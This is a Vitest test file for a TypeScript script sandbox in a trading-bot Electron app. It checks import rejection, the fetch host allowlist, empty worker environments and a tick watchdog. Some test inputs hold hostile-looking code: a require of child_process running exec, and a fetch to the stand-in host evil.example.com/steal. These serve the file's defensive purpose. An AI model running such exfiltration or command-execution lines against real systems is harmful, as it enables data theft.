/**
 * Script sandbox (spec §5.1): compile-time import rejection, worker without require/process/env,
 * allowlisted ctx.fetch through the main process, tick watchdog.
 * Spawns real worker threads from an esbuild bundle of worker-bootstrap.ts.
 */

import { describe, it, expect, vi, beforeAll, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';

vi.mock('../../src/utils/logger', () => ({
  default: { info: vi.fn(), warning: vi.fn(), error: vi.fn() },
}));

import { compileScript } from '../../electron/runtime/compileScript';
import { ScriptRunner, type ScriptRunnerOptions } from '../../electron/runtime/ScriptRunner';
import { scriptFetch } from '../../electron/runtime/scriptFetch';
import { evaluateScript } from '../../electron/runtime/sandbox';
import { buildWorker, ROOT } from './buildWorker';

async function compileOk(source: string): Promise<string> {
  const r = await compileScript(source);
  if ('error' in r) throw new Error(r.error);
  return r.code;
}

describe('compileScript', () => {
  it('rejects module imports', async () => {
    const r = await compileScript("import fs from 'fs';\nexport function onTick() { fs.readFileSync('x'); }");
    expect(r).toHaveProperty('error');
    expect((r as { error: string }).error).toMatch(/Imports are not allowed.*"fs"/);
  });

  it('rejects require() and dynamic import()', async () => {
    const r1 = await compileScript("const cp = require('child_process');\nexport function onTick() { cp.exec('ls'); }");
    expect((r1 as { error: string }).error).toMatch(/child_process/);
    const r2 = await compileScript("export async function onTick() { await import('node:fs'); }");
    expect((r2 as { error: string }).error).toMatch(/node:fs/);
    const r3 = await compileScript("import { x } from './helper';\nexport function onTick() { return x; }");
    expect(r3).toHaveProperty('error');
  });

  it('allows type-only imports', async () => {
    const code = await compileOk("import type { BotContext } from '../sdk/types';\nexport async function onTick(ctx: BotContext) { ctx.log.info('x'); }");
    expect(evaluateScript(code, {}).onTick).toBeTypeOf('function');
  });

  it('compiles every builtin template', async () => {
    const dir = path.join(ROOT, 'electron', 'scripts', 'templates');
    const files = fs.readdirSync(dir).filter((f) => f.endsWith('.ts'));
    expect(files.length).toBeGreaterThan(0);
    for (const f of files) {
      const code = await compileOk(fs.readFileSync(path.join(dir, f), 'utf-8'));
      const exp = evaluateScript(code, {});
      expect(typeof exp.onStart === 'function' || typeof exp.onTick === 'function').toBe(true);
    }
  });

  it('evaluateScript does not pass require or process', async () => {
    const exp = evaluateScript('exports.r = typeof require; exports.p = typeof process;', {});
    expect(exp).toMatchObject({ r: 'undefined', p: 'undefined' });
  });
});

describe('scriptFetch (main side)', () => {
  const okResponse = () => new Response('{"a":1}', { status: 200, headers: { 'content-type': 'application/json' } });

  it('rejects hosts outside the allowlist, http and other methods', async () => {
    const fetchImpl = vi.fn(async () => okResponse());
    await expect(scriptFetch('https://evil.example.com/x', undefined, { fetchImpl })).rejects.toThrow(/host not allowed/);
    await expect(scriptFetch('http://data-api.polymarket.com/x', undefined, { fetchImpl })).rejects.toThrow(/only https/);
    await expect(scriptFetch('https://data-api.polymarket.com/x', { method: 'DELETE' }, { fetchImpl })).rejects.toThrow(/method not allowed/);
    await expect(scriptFetch('https://data-api.polymarket.com.evil.com/x', undefined, { fetchImpl })).rejects.toThrow(/host not allowed/);
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('does not follow a redirect to a host outside the allowlist', async () => {
    const fetchImpl = vi.fn(async () => new Response(null, { status: 302, headers: { location: 'https://evil.example.com/' } }));
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl })).rejects.toThrow(/host not allowed: evil/);
    expect(fetchImpl).toHaveBeenCalledTimes(1);
  });

  it('caps the response size', async () => {
    const big = 'x'.repeat(5000);
    const fetchImpl = vi.fn(async () => new Response(big, { status: 200 }));
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl, maxBytes: 1000 })).rejects.toThrow(/too large/);
  });

  it('times out', async () => {
    const fetchImpl = vi.fn(
      (_url: string, init: RequestInit) =>
        new Promise<Response>((_res, rej) => init.signal!.addEventListener('abort', () => rej(new Error('aborted'))))
    ) as unknown as typeof fetch;
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl, timeoutMs: 50 })).rejects.toThrow(/timed out/);
  });

  it('honours a configured allowlist', async () => {
    const fetchImpl = vi.fn(async () => okResponse());
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl, allowlist: ['example.org'] })).rejects.toThrow(/host not allowed/);
    const r = await scriptFetch('https://EXAMPLE.org/x', undefined, { fetchImpl, allowlist: ['example.org'] });
    expect(r).toMatchObject({ ok: true, status: 200, body: '{"a":1}' });
  });
});

describe('script worker', () => {
  let bootstrapPath: string;
  const runners: ScriptRunner[] = [];

  beforeAll(async () => {
    bootstrapPath = await buildWorker(path.join(ROOT, 'electron', 'runtime', 'worker-bootstrap.ts'));
  }, 30_000);

  afterEach(async () => {
    for (const r of runners.splice(0)) await r.stop(2000).catch(() => undefined);
  });

  function makeRunner(compiledCode: string, overrides: Partial<ScriptRunnerOptions> = {}, fetchImpl?: typeof fetch): ScriptRunner {
    const runner = new ScriptRunner({
      compiledCode,
      botId: 'bot-1',
      botName: 'Sandbox Bot',
      config: { pollingIntervalMs: 20 },
      walletAddress: '0xwallet',
      bootstrapPath,
      rpcHandlerDeps: {
        clobClient: {} as never,
        storageRepo: { get: vi.fn(), set: vi.fn(), delete: vi.fn() } as never,
        tradeRepo: {} as never,
        botId: 'bot-1',
        botName: 'Sandbox Bot',
        scriptName: 'sandbox',
        walletAddress: '0xwallet',
        rpcUrl: 'http://rpc',
        usdcContractAddress: '0xusdc',
        clobHttpUrl: 'http://clob',
        fetchImpl,
      },
      ...overrides,
    });
    runner.on('error', () => undefined);
    runners.push(runner);
    return runner;
  }

  function nextEvent<T>(runner: ScriptRunner, name: string, timeoutMs = 10_000): Promise<T> {
    return new Promise<T>((resolve, reject) => {
      const t = setTimeout(() => reject(new Error(`no ${name} event`)), timeoutMs);
      runner.once(name, (e: T) => {
        clearTimeout(t);
        resolve(e);
      });
    });
  }

  it('has no require/process, and ctx.fetch only reaches allowlisted hosts through the main process', async () => {
    const fetchImpl = vi.fn(async () => new Response('[{"type":"TRADE"}]', { status: 200, headers: { 'Content-Type': 'application/json' } }));
    const code = await compileOk(`
      export async function onStart(ctx) {
        const g = Function('return this')();
        let denied = '';
        try { await ctx.fetch('https://evil.example.com/steal?k=1'); } catch (e) { denied = e.message; }
        const resp = await ctx.fetch('https://data-api.polymarket.com/activity?user=0xabc');
        ctx.emit('probe', {
          require: typeof require,
          process: typeof process,
          globalProcess: typeof g.process,
          fetch: typeof fetch,
          globalFetch: typeof g.fetch,
          denied,
          ok: resp.ok,
          status: resp.status,
          contentType: resp.headers.get('content-type'),
          body: await resp.json(),
        });
      }
    `);
    const runner = makeRunner(code, {}, fetchImpl as unknown as typeof fetch);
    const probe = nextEvent<{ type: string; data: Record<string, unknown> }>(runner, 'event');
    await runner.start();
    const { type, data } = await probe;
    expect(type).toBe('probe');
    expect(data).toMatchObject({
      require: 'undefined',
      process: 'undefined',
      globalProcess: 'undefined',
      fetch: 'undefined',
      globalFetch: 'undefined',
      ok: true,
      status: 200,
      contentType: 'application/json',
      body: [{ type: 'TRADE' }],
    });
    expect(String(data.denied)).toMatch(/host not allowed: evil\.example\.com/);
    expect(fetchImpl).toHaveBeenCalledTimes(1);
    expect((fetchImpl.mock.calls[0] as unknown[])[0]).toBe('https://data-api.polymarket.com/activity?user=0xabc');
  });

  it('starts workers with an empty env and heap limits', async () => {
    process.env.BOTLAB_TEST_SECRET = 'do-not-leak';
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'botlab-probe-'));
    const probePath = path.join(dir, 'probe.js');
    fs.writeFileSync(
      probePath,
      `const { parentPort } = require('worker_threads');
       const v8 = require('v8');
       parentPort.on('message', (m) => {
         if (m.type === 'start') {
           parentPort.postMessage({ type: 'rpc-request', request: { id: 'p1', method: 'emit', args: ['env', {
             envKeys: Object.keys(process.env),
             heapLimitMb: v8.getHeapStatistics().heap_size_limit / 1048576,
           }] } });
           parentPort.postMessage({ type: 'started' });
         } else if (m.type === 'stop') {
           parentPort.postMessage({ type: 'stopped' });
         }
       });`
    );
    try {
      const runner = makeRunner('', { bootstrapPath: probePath });
      const ev = nextEvent<{ data: { envKeys: string[]; heapLimitMb: number } }>(runner, 'event');
      await runner.start();
      const { data } = await ev;
      expect(data.envKeys).toEqual([]);
      expect(data.heapLimitMb).toBeLessThan(400);
    } finally {
      delete process.env.BOTLAB_TEST_SECRET;
    }
  });

  it('watchdog terminates a worker whose onTick never returns (sync loop)', async () => {
    const code = await compileOk('export function onTick(ctx) { while (true) {} }');
    const runner = makeRunner(code, { tickTimeoutMs: 100, maxTickTimeouts: 3 });
    const strikes: number[] = [];
    runner.on('tick-timeout', (e: { strikes: number }) => strikes.push(e.strikes));
    const fatal = nextEvent<{ reason: string; message: string }>(runner, 'fatal');
    await runner.start();
    const f = await fatal;
    expect(f.reason).toBe('tick_watchdog');
    expect(strikes).toEqual([1, 2, 3]);
    expect(runner.isRunning).toBe(false);
  });

  it('watchdog terminates a worker whose onTick hangs asynchronously', async () => {
    const code = await compileOk('export function onTick(ctx) { return new Promise(() => {}); }');
    const runner = makeRunner(code, { tickTimeoutMs: 100, maxTickTimeouts: 3 });
    const fatal = nextEvent<{ reason: string }>(runner, 'fatal');
    await runner.start();
    expect((await fatal).reason).toBe('tick_watchdog');
  });

  it('a slow tick that recovers resets the strike count', async () => {
    // First tick takes ~250 ms (2 strikes at 100 ms), the rest are fast: never 3 in a row
    const code = await compileOk(`
      let n = 0;
      export async function onTick(ctx) {
        n++;
        if (n === 1 || n === 3) await new Promise((r) => setTimeout(r, 250));
      }
    `);
    const runner = makeRunner(code, { tickTimeoutMs: 100, maxTickTimeouts: 3 });
    const onFatal = vi.fn();
    runner.on('fatal', onFatal);
    await runner.start();
    await new Promise((r) => setTimeout(r, 1200));
    expect(onFatal).not.toHaveBeenCalled();
    expect(runner.isRunning).toBe(true);
  });

  it('a clean stop is not reported as fatal', async () => {
    const code = await compileOk('export function onTick(ctx) {}');
    const runner = makeRunner(code);
    const onFatal = vi.fn();
    runner.on('fatal', onFatal);
    await runner.start();
    await runner.stop(2000);
    await new Promise((r) => setTimeout(r, 50));
    expect(onFatal).not.toHaveBeenCalled();
  });
});
